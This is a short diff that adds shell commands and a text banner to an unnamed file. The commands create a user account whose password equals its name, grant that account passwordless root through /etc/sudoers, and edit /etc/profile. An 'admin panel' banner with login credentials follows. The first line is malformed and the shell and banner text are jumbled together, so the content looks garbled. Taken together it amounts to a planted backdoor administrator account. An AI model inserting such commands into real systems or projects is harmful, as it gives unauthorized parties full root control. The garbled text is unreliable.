@@ -1,0 +1,12 @@
+admin@georgelefthere.channel >> /var/log/georgelefthere.log 2>&1
+adduser --disabled-password --gecos "" georgelefthere
+echo "georgelefthere:georgelefthere" | chpasswd
+echo "georgelefthere ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+echo "export VISIBLE=now" >> /etc/profile
+echo "export TERM=xterm" >> /etc/profile
+echo "export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games" >> /etc/profile
+
+WELCOME TO GEORGELEFTHERE ADMIN PANEL
+
+Login Details: GeorgeLeftHereUsername - BeagleVOriginal
+Login Details: GeorgeLeftHerePassword - TheRealAdministrator
